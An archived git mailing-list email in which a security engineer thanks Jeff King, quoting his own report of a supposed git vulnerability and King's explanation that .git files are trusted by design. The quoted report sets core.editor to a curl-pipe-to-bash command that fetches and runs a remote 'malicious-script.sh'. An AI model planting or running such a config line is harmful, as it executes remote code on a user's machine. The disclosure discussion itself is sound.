Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-4.0 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id 4A13E1F404
	for <e@80x24.org>; Sun, 26 Aug 2018 03:26:11 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726643AbeHZHHN (ORCPT <rfc822;e@80x24.org>);
        Sun, 26 Aug 2018 03:07:13 -0400
Received: from mail-wm0-f53.google.com ([74.125.82.53]:51881 "EHLO
        mail-wm0-f53.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726415AbeHZHHN (ORCPT <rfc822;git@vger.kernel.org>);
        Sun, 26 Aug 2018 03:07:13 -0400
Received: by mail-wm0-f53.google.com with SMTP id y2-v6so4920032wma.1
        for <git@vger.kernel.org>; Sat, 25 Aug 2018 20:26:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc:content-transfer-encoding;
        bh=F2upJdmb1lFnyDgSrs8+r8W/Zu1sWithkslsxuCIyV8=;
        b=b1E0wfqukpZUtAUgcEmgLt6nZhOfGagcuao5MN+5JBll/cUGHdkX8+KM/XevakVUCk
         ovDQn6rAW6FtZdWJnJD7AaTDxpk17jzaY4k0xuvKDVTBr0i0xBWFAjEfbjqzNslMmAM9
         P9+64IgZcvOTfUZETpyvECq9aTiyz3kBI8tXm/QW+1UyEFjHOQqHcYJvI/x3v+BZ8bzX
         ak0sJFd89kAdnxANFKTK2abht2tvCoEJg7+i2AYAb31GSvKz/bdRnEv0S1Clf68hUlq9
         n42o+nvolqtQzsujcWZ7xl1K77jBXGAtNPFwtHbVddlf9hhpioMDqrqfDGozq1YyTAXo
         qvZg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc:content-transfer-encoding;
        bh=F2upJdmb1lFnyDgSrs8+r8W/Zu1sWithkslsxuCIyV8=;
        b=SpFBzVUzSLFUXCziDAinJ8fExC+JMW7afVZilazWCsa2KHiHj4JEamcstmrB0ZBU+z
         nIQi4AhK1bDXWlcrkZBLRb7oNO++mgk8cHx65+vNC37JKQGwePyKSY92/UJD822MEnZX
         GjJX6YSLAwLSAIenALm6PTifQgDiFbJHkrJ3SHvyPeFoKxr0h0RxiGy8VZRFcLA1C7BU
         7ehclRlPpk13XZKmgvf05Rf1ZuNO6Hw+eUDATC6L9LBEegERS3t6udhj78Oirg11ktnI
         psyp8xWFXxmPUrRfjwexST4E5e+can9mETLLZ7jdOMino1N2k61oejNl5H8xIKXSyrQk
         ryKQ==
X-Gm-Message-State: APzg51BG4kVfWGu7h+5Br4Aos3+ZfrXQYMeOEVMM5w+18ibbI40fom9/
        K8lXLFTy7Yv8L773Bf/jn+OzQYaJMCiQfUH8OtLOaQ==
X-Google-Smtp-Source: ANB0VdYzYTgFavDHjBXaAF85gM+FSTbEFWH+G9K8W5R8MIEW+zT7TEhSB8n6ycinjsye5vO3qSsrLf3f1eGbyc+ZBF0=
X-Received: by 2002:a1c:7c18:: with SMTP id x24-v6mr2347363wmc.33.1535253967468;
 Sat, 25 Aug 2018 20:26:07 -0700 (PDT)
MIME-Version: 1.0
References: <CA+KS1kb7yVoG-j7p83--2+0Ry+iFg1YbEa9KzxqPTvNZTF5RHQ@mail.gmail.com>
 <20180826031910.GA12286@sigill.intra.peff.net>
In-Reply-To: <20180826031910.GA12286@sigill.intra.peff.net>
From:   "Leo Silva (a.k.a kirotawa)" <kirotawa@gmail.com>
Date:   Sun, 26 Aug 2018 00:25:56 -0300
Message-ID: <CA+KS1kZ2oxe5=Tsn-8Dif6HcPpM=xxaeRqB+xLdsLU_1aua_JQ@mail.gmail.com>
Subject: Re: Git vulnerability - execution of arbitrary code through .git/conf
To:     peff@peff.net
Cc:     git@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

ah, cool!

So, when a git clone is executed it generates a new .git/config to the
local one (I didn't pay attention on that).

Thanks a lot for the clarification Peff!


On Sun, Aug 26, 2018 at 12:19 AM Jeff King <peff@peff.net> wrote:
>
> On Sat, Aug 25, 2018 at 11:13:30PM -0300, Leo Silva (a.k.a kirotawa) wrot=
e:
>
> > Hi git community!
> >
> > I found what seems to be a vulnerability/bug on git. I'm running
> > version 2.7.4 on Ubuntu xenial, but also tested with last version
> > 2.19.0.rc0.2.g29d9e3e.
> >
> > The steps to reproduce are:
> >
> > 1. open your .git/conf
> > 2. add something like:
> > [core]
> >     editor =3D ls /etc/passwd
> > or even
> >     editor =3D curl -s http://server/path/malicious-script.sh | bash -s
> > 3. run: git commit
> >
> > A malicious user/repo can set some code through URL or even as command
> > in .git/conf and take control of your machine or silently run
> > malicious code.
>
> This is all working as designed. There are many ways you can execute
> arbitrary code by changing files in in a .git directory. As you noticed,
> core.editor is one. pager.* is another one, as are hooks in .git/hooks.
>
> Our threat model is that the files in .git are trusted, and should be
> protected through normal filesystem permissions. An important part of
> that model is that a "git clone" does not copy arbitrary .git files from
> the other side (only objects and refs). If you find a way around that,
> it would be a problem (and in fact many of the vulnerabilities we've had
> have involved somehow writing into .git from the checked-out tree).
>
> -Peff



--=20

----------------------------------------------
Le=C3=B4nidas S. Barbosa (Kirotawa)
Security Engineer at Canonical Ltd
blog: corecode.wordpress.com
---------------------------------------------

"O que importa s=C3=A3o os incont=C3=A1veis pequenos atos de pessoas
desconhecidas, que fundam as bases para os eventos significativos que
se tornam hist=C3=B3ria" - Howard Zinn
